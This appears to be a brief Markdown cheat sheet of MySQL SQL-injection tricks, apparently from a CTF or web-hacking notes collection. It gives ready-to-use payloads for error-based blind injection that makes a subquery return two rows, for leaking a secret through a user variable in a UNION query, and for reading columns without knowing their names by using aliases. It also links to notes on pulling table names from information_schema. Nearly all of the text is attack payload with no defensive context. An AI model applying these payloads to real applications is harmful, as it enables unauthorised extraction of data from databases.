## Generating Runtime Error

    select 1=if(CONDITION, 1, (select 1 union 2))
---
    select 1=(select CONDITION union select 1)

    # if condition is true : len(row) = 1
    # if condition is false: len(row) = 2 -- error

## Column name related

#### Leaking

1. Variable


    select * from table where @a:=<Secret> union select @a;

2. information_schema / inno_db

[Leaking_Table_Name](./Leaking_Table_Name.md)

#### Without Leaking

1. Using alias(as)


    select a from table where (select 1 as a union select * from table) as b limit 1,1
